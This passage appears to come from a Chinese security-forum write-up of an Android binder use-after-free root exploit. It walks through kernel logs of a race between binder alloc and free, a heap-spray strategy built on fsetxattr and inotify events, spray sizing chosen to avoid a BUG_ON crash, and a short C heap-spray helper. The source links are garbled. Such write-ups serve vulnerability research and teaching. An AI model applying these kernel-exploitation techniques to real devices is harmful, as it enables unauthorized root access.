
```text
[   53.486434] c1   2536 jltxgcy binder alloc begin, target pid:2522

[   53.486488] c1   2522 jltxgcy binder free begin, pid:2522, user addr:0000007dd3b3c8f0

[   53.486523] c1   2536 jltxgcy binder alloc end, target pid:2522, buffer:ffffffc06ef79400, buffer user data:7dd3b3c8f0

[   53.486543] c1   2522 jltxgcy binder free end, pid:2522, buffer:ffffffc06ef79400

[   53.486554] c1   2522 jltxgcy pid:2522, kfree:ffffffc0be588280, cpuid:1

[   53.486570] c1   2522 jltxgcy binder free begin, pid:2522, user addr:0000007dd3b3c8d8

[   53.486577] c1   2522 jltxgcy binder free end, pid:2522, buffer:ffffffc06ef79280

[   53.486585] c1   2522 jltxgcy pid:2522, kfree:ffffffc06ef79400, cpuid:1

[   53.486604] c1   2522 jltxgcy pid:2522, kvalue:ffffffc0be588280, size:96

[   53.486746] c1   2522 jltxgcy pid:2522, event:ffffffc0be588300, alloc_len:54

[   53.486763] c1   2522 jltxgcy pid:2522, kvalue:ffffffc0c42bf400, size:1000

[   53.486795] c1   2522 jltxgcy pid:2522, event:ffffffc0be588280, alloc_len:65

.............占位kfree:ffffffc06ef79400成功 省略了

jltxgcy binder ocuppy end, target pid:2522, buffer:ffffffc06ef79400, free:0, user_allow_free:0, buffer data:ffffffc001e50834, buffer user data:7dd3b3c8f0, cupid:1
```

我们可以看到`alloc begin`打的位置是在`mutex_lock(&alloc->mutex)`锁里面，而`free begin`是在`mutex_lock(&alloc->mutex)`锁外面，所以执行流程是 server `alloc_begin`进入锁，此时 client `free_begin`申请锁睡眠等待，然后 server `alloc_end`释放锁，同时唤醒 client 获取锁执行 `free end`。之所以让 client 和 server 占用一个 CPU，也是因为这里的等待唤醒机制，在狭窄窗口到来时唤醒 client 进程，形成竞争。

之后我们再释放前一个`binder_buffer`时，会`kfree`当前`binder_buffer`，`kfree:ffffffc06ef79400`，然后堆喷占位成功。最后一条日志可以看到，`binder_data`已经被赋值为目标地址`fffffc001e50834`。

## 6、再次理解堆喷占位

```text
[   53.486604] c1   2522 jltxgcy pid:2522, kvalue:ffffffc0be588280, size:96        //占位1

[   53.486746] c1   2522 jltxgcy pid:2522, event:ffffffc0be588300, alloc_len:54  //占位2

[   53.486763] c1   2522 jltxgcy pid:2522, kvalue:ffffffc0c42bf400, size:1000     //占位3

[   53.486795] c1   2522 jltxgcy pid:2522, event:ffffffc0be588280, alloc_len:65  //占位4
```

由于我们调用了两次`fsetxattr`，所以会形成如上的日志。

我们的目标是占位 4，覆盖占位 1。所以我精心设计了占位 2、占位 3 的大小，以避免占位 2 和占位 3 把占位 1 给覆盖了。

## 7、`heapGuard`为什么不用`open`函数

常规触发`inotify_handle_event`是使用`open`的。实际上我最开始使用的是`open`，但是发现占位 2 总是覆盖不上占位 1。最后发现`open`函数调用连上`error = security_file_alloc(f);`，这个函数把占位 1 的位置给覆盖了，所以后来选用了`setxattr`函数。

## 8、占位 2 的大小实际上是精心设计的，否则会 crash

在`binder_transaction`中，`copy_from_user`后会有一个检查：

```c
BUG_ON(t->buffer->async_transaction != 0);
```

如果`t->buffer->async_transaction`不等于 0，会 crash。

![](https://bbs.kanxue.com/upload/attach/202001/93_CXV7Q3HD4SHYGZ5.jpg)

![](https://bbs.kanxue.com/upload/attach/202001/93_8J2733JD42AD5F8.jpg)

图片 7 引用于《D2T2 - Binder - The Bridge to Root - Hongli Han & Mingjian Zhou》。

从上图可以看到，`async_transaction`正是`name_len`的值，所以这个我设置为 8，`async_transaction`为 0，这也就是`abcd.txt`（长度为 8）的来源。

```c
void init_fd_heap_spray()
{
    const char *path = "/data/local/tmp/test_dir/abcd.txt";

    fd_heap_spray = open(path, O_WRONLY);

    if (fd_heap_spray < 0)
    {
        printf("[-] fd_heap_spray failed\n");
    }
}
```

## 五、老规矩上图

![](https://bbs.pediy.com/upload/attach/202001/93_K4XHDHZXFFHSW7A.jpg)

## 六、致谢

感谢@牛maomao，关于漏洞利用细节给了很多建设性的意见，也让我深刻感到自己和大牛之间的差距。

## 七、源码地址

`953K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6B7L8s2c8^5k6$3y4&6i4K6u0r3b7#2k6q4i4K6g2X3x3U0l9I4z5g2)9#2k6U0t1H3x3U0g2Q4y4h3k6q4h3q4l9`

### 参考

[1] `205K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0L8$3&6X3k6i4u0W2L8X3y4W2i4K6u0W2K9r3W2@1j5W2)9J5k6h3!0J5k6#2)9J5c8X3S2A6N6r3u0K6k6h3y4U0L8$3&6X3x3U0l9I4z5h3q4E0M7#2)9J5c8X3#2S2N6r3g2J5K9h3q4D9M7#2)9J5c8V1b7J5g2o6u0Q4x3U0f1J5x3q4)9J5k6q4)9J5y4e0t1H3b7X3W2F1k6r3g2J5i4K6t1#2x3U0m8Q4x3X3c8Q4x3U0f1J5x3q4c8Z5k6g2)9J5y4e0t1H3b7Y4u0A6k6r3N6W2i4K6t1#2x3U0m8@1L8#2)9J5y4e0t1H3f1X3!0G2N6q4)9J5y4e0t1H3i4K6u0V1i4K6t1#2x3U0m8t1L8$3&6Y4L8r3W2Q4x3U0f1J5x3q4c8Z5k6g2)9J5y4e0t1H3i4K6t1$3j5h3#2H3i4K6y4n7i4K6t1#2x3U0m8y4K9h3&6Y4K9X3W2S2L8W2)9J5y4e0t1H3h3X3S2G2N6g2)9J5k6i4m8V1k6R3`.`

[2] `45cK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3u0D9L8$3N6K6i4K6u0W2x3K6j5H3i4K6u0W2j5$3&6Q4x3V1k6H3L8%4y4@1i4K6u0r3b7X3W2F1k6r3g2J5i4K6g2X3d9$3g2J5L8X3g2D9i4K6g2X3g2Y4g2D9i4K6g2X3b7@1S2Q4x3X3g2Z5N6r3#2D9`

[3] [原创](Android Root)CVE-2017-7533 漏洞分析和复现  
https://bbs.pediy.com/thread-248481.htm

[4] [分享] KSMA -- Android 通用 Root 技术  
https://bbs.pediy.com/thread-248444.htm

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

最后于 2020-1-31 20:36 被 kanxue 编辑，原因：
